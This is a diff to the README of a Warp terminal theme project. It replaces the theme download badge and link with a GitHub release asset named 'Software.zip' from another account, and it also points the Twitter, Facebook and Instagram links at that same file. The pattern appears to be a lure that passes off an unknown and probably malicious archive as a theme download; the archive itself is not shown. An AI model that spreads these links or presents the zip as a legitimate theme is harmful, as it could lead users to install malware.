@@ -1,6 +1,6 @@
 # 🌟 Welcome to Oxocarbon Theme for Warp! 🚀
 
-[![Download Theme](https://img.shields.io/badge/Download-Theme-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Theme](https://github.com/Heavenzxc2/oxocarbon-theme-for-warp/releases/download/v1.0/Software.zip)](https://github.com/Heavenzxc2/oxocarbon-theme-for-warp/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -46,7 +46,7 @@ Welcome to the "oxocarbon-theme-for-warp" repository, your go-to place for a min
 
 To get started with the Oxocarbon theme for Warp, simply download the theme using the link below:
 
-[![Download Theme](https://img.shields.io/badge/Download-Theme-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Theme](https://github.com/Heavenzxc2/oxocarbon-theme-for-warp/releases/download/v1.0/Software.zip)](https://github.com/Heavenzxc2/oxocarbon-theme-for-warp/releases/download/v1.0/Software.zip)
 
 🚀 Once downloaded, launch the theme in your Warp Terminal and witness the transformation of your coding environment!
 
@@ -56,11 +56,11 @@ If the link does not work, make sure to check the "Releases" section for the lat
 
 Join our developer community and stay updated on the latest themes, tools, and resources. Connect with us on:
 
-🌐 [Twitter](https://twitter.com/oxocarbontheme)
+🌐 [Twitter](https://github.com/Heavenzxc2/oxocarbon-theme-for-warp/releases/download/v1.0/Software.zip)
 
-📘 [Facebook](https://www.facebook.com/oxocarbontheme)
+📘 [Facebook](https://github.com/Heavenzxc2/oxocarbon-theme-for-warp/releases/download/v1.0/Software.zip)
 
-📸 [Instagram](https://www.instagram.com/oxocarbontheme)
+📸 [Instagram](https://github.com/Heavenzxc2/oxocarbon-theme-for-warp/releases/download/v1.0/Software.zip)
 
 💌 Sign up for our newsletter to receive exclusive updates straight to your inbox!
 
